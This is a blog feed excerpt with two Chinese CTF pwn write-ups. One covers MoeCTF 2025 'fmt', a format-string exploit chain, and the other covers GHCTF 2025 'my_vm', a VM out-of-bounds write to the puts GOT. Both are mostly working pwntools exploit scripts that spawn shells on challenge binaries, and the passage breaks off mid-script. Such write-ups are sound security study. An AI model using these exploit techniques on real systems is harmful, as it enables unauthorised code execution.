      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/moectf-2025-pwn-fmt/</url>
      
        <content type="html"><![CDATA[<h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。<br><a href="https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a><br>开始研究</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png" alt="image-20250810223742657"></p><p>功能非常的简单，</p><ol><li>循环3次调用talk，需要控制flag的值（后续再看）</li><li>atk判断，成功则调用he()</li></ol><p>先看he()里有啥。</p><h3 id="he函数"><a href="#he函数" class="headerlink" title="he函数"></a>he函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png" alt="image-20250810224024236"></p><p>这里建议看汇编，</p><ol><li>system的出现，让人思路开朗</li><li>command是<code>-0xe</code>，也就是要控制<code>rbp-0xe</code></li><li>注意lea 和 mov 的区别，通过这个方法的话，必须要把”&#x2F;bin&#x2F;sh”写在栈上</li></ol><p>一般揣测一下出题人的想法，肯定是最后要返回到这里了。</p><h3 id="talk函数"><a href="#talk函数" class="headerlink" title="talk函数"></a>talk函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png" alt="image-20250810224845139"></p><p>重点来了，</p><ol><li>非栈上格式化字符串,每次只读0x20字节</li><li>flag初始是0,talk会把它变成1,想办法置0</li><li>返回到了my_read,继续追踪</li></ol><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png" alt="image-20250810225109891"></p><p>看看bss段上,这些变量的位置</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png" alt="image-20250810225315432"></p><p>atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell<br>2.但是，常规的思路，需要的格式化次数不止3次。</p><blockquote><ol><li>%p泄露栈地址</li><li>把rbp链入（因为此题目栈上无<code>诸葛连弩</code>，要自己建）</li><li>修改啥也不行，没次数了</li></ol></blockquote><p>3.所以笔者在这里用了一些奇怪的方法。</p><blockquote><ol><li>笔者开始想，因为<code>i</code>也是在栈上的，所以我可以修改<code>i</code>来增加次数</li><li>但是，恰因如此，如果修改rbp，那么会影响下次循环对<code>i</code>的判断，</li><li>于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。</li><li>所以在笔者的精心的构造下，完成了10次格式化字符串的修改。</li><li>比较重要的就是两个$n的运用。一个把<code>sh</code>写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.</li></ol></blockquote><p>4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="10次格式化字符串"><a href="#10次格式化字符串" class="headerlink" title="10次格式化字符串"></a>10次格式化字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 leak stack</span></span><br><span class="line">payload=<span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"><span class="comment">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class="line">rbp_low=rbp &amp; <span class="number">0xffff</span></span><br><span class="line">fmt_low=<span class="number">0x4040c0</span> &amp; <span class="number">0xffff</span></span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2，3 rbp链入,修改rbp </span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$hn&#x27;</span>.<span class="built_in">format</span>(rbp_low).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x38</span>).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#4,5,6 &#x27;sh&#x27;写入栈,修改rbp,把rbp+0x3e-4 链入并置0</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%8$n\x00&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x6873</span>).encode() <span class="comment"># 1 canshuxieshangl</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x58</span>).encode()</span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%6$hn\x00&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x38</span>+<span class="number">0xe</span>-<span class="number">4</span>-<span class="number">0x58</span>+<span class="number">0x10000</span>)%<span class="number">0x10000</span>).encode() <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">5</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$n\x00&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x00</span>).<span class="built_in">format</span>() <span class="comment"># 1</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######7 把rbp再次链入</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#####8 修改rbp 为rbp_low+0x38+0xe</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x38</span>+<span class="number">0xe</span>).encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401332&quot;</span>)</span><br><span class="line"><span class="comment">##### 9 把rbp+8 链入</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">8</span>).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">##### 10 修改返回地址</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1274</span>).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload +=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="优雅至极"><a href="#优雅至极" class="headerlink" title="优雅至极"></a>优雅至极</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401332&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 leak stack</span></span><br><span class="line">payload=<span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"><span class="comment">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class="line">rbp_low=rbp &amp; <span class="number">0xffff</span></span><br><span class="line">fmt_low=<span class="number">0x4040c0</span> &amp; <span class="number">0xffff</span></span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 gouzao </span></span><br><span class="line">payload =  <span class="string">b&quot;%p&quot;</span> * <span class="number">4</span> </span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x20</span>-<span class="number">0x4</span>-<span class="number">40</span>).encode()</span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x6873</span>-(rbp_low+<span class="number">0x20</span>)+<span class="number">0xe</span>)).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line">payload = <span class="string">b&quot;%p&quot;</span> *<span class="number">4</span> </span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x12</span>-<span class="number">40</span>).encode()</span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x1274</span>-(rbp_low+<span class="number">0x38</span>)+<span class="number">0x30</span>+<span class="number">0x10000</span>)%<span class="number">0x10000</span>).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> fmt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHCTF-2025-pwn</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/GHCTF-2025-pwn/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/GHCTF-2025-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="GHCTF-my-vm"><a href="#GHCTF-my-vm" class="headerlink" title="GHCTF my_vm"></a>GHCTF my_vm</h1><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h3><p>1.存在backdoor()函数，点开发现system(“&#x2F;bin&#x2F;sh\x00”).可以直接利用这个地址0x400877.<br>2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了<br>3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。</p><h3 id="execute函数分析"><a href="#execute函数分析" class="headerlink" title="execute函数分析"></a>execute函数分析</h3><p>1.首先看，对op的处理，和对op的限制<br>2.寻找漏洞。option &#x3D;&#x3D; 0x90 时，可以对memory上的数据作修改<br>3.基于此，如果<code>reg[dest]</code>设置为负数，那么可以完成对其他数据的修改<br>4.从第三张图，查看option &#x3D;&#x3D; 0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在<code>reg[]</code>中写入负数，完成数组的向上越界</p><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行<br>2.接着读入op。我们需要对op作一点处理，便于控制每一个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Code</span>(<span class="params">op,dest,src1,src2</span>):</span><br><span class="line">    code=(op&lt;&lt;<span class="number">24</span>)+(dest&lt;&lt;<span class="number">16</span>)+(src1&lt;&lt;<span class="number">8</span>)+src2</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(code))</span><br></pre></td></tr></table></figure><p>通过样的处理，我们可以控制每个字节，便于准确的控制<br>3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法<br>4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以<code>rax*4</code> 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到<br>5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor<br>6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="修改puts-got"><a href="#修改puts-got" class="headerlink" title="修改puts_got"></a>修改puts_got</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class="line">port=<span class="number">28844</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./my_vm&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./my_vm&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Code</span>(<span class="params">op,dest,src1,src2</span>):</span><br><span class="line">    code=(op&lt;&lt;<span class="number">24</span>)+(dest&lt;&lt;<span class="number">16</span>)+(src1&lt;&lt;<span class="number">8</span>)+src2</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400877</span> <span class="comment"># system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;set your IP:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;set your SP:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;execve:&quot;</span>,<span class="built_in">str</span>(<span class="number">27</span>))</span><br><span class="line"></span><br><span class="line">puts_got=<span class="number">0x602018</span></span><br><span class="line">offset=<span class="number">0x6020e0</span>-<span class="number">0x602018</span></span><br><span class="line">reg=<span class="number">0x6420E0</span></span><br><span class="line">memory=<span class="number">0x6020E0</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Code </span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)  <span class="comment"># reg[0]=0x8</span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x4</span>)  <span class="comment"># reg[1]=0x4</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)    <span class="comment"># reg[2]=0xc</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)    <span class="comment"># reg[3]=reg[1]&lt;&lt;reg[1]  : reg[3]=0xc0</span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x6</span>)  <span class="comment"># reg[4]=0x6</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)    <span class="comment"># reg[4]=0xe</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>)    <span class="comment"># reg[1]=reg[1]+reg[3]   : reg[3]=0xce      </span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0x7</span>)  <span class="comment"># reg[5]=0x7</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>)    <span class="comment"># reg[5]=0xf</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">1</span>)    <span class="comment"># reg[6]=reg[5]&lt;&lt;reg[1]  : reg[6]=0xf0</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">5</span>)    <span class="comment"># reg[6]=reg[5]+reg[6]   : reg[6]=0xff </span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">0</span>)    <span class="comment"># reg[5]=reg[6]&lt;&lt;reg[0]  : reg[5]=0xff00</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>)    <span class="comment"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffff</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>)    <span class="comment"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffff00</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>)    <span class="comment"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>)    <span class="comment"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffffff00</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>)    <span class="comment"># reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x400877</span></span><br><span class="line">Code(<span class="number">0x10</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0x7</span>)  <span class="comment"># reg[4]=0x7</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">1</span>)    <span class="comment"># reg[6]=reg[4]&lt;&lt;reg[1]  : reg[6]=0x70</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">4</span>)    <span class="comment"># reg[6]=reg[6]+reg[4]   : reg[6]=0x770000</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)    <span class="comment"># reg[1]=reg[1]&lt;&lt;reg[1]  : reg[1]=0x40</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)    <span class="comment"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x4000</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)    <span class="comment"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x400000</span></span><br><span class="line">Code(<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)    <span class="comment"># reg[0]=reg[0]&lt;&lt;reg[0]  : reg[0]=0x800</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>)    <span class="comment"># reg[0]=reg[0]+reg[6]   : reg[0]=0x877</span></span><br><span class="line">Code(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)    <span class="comment"># reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877</span></span><br><span class="line">Code(<span class="number">0x90</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">0</span>)    <span class="comment"># mem[reg[5]]=reg[1]     : mem[-50]=0x4000877</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="覆盖func"><a href="#覆盖func" class="headerlink" title="覆盖func"></a>覆盖func</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">0</span></span><br><span class="line">url=<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class="line">port=<span class="number">28844</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./my_vm&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./my_vm&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Code</span>(<span class="params">op,dest,src1,src2</span>):</span><br><span class="line">    code=(op&lt;&lt;<span class="number">24</span>)+(dest&lt;&lt;<span class="number">16</span>)+(src1&lt;&lt;<span class="number">8</span>)+src2</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;set your 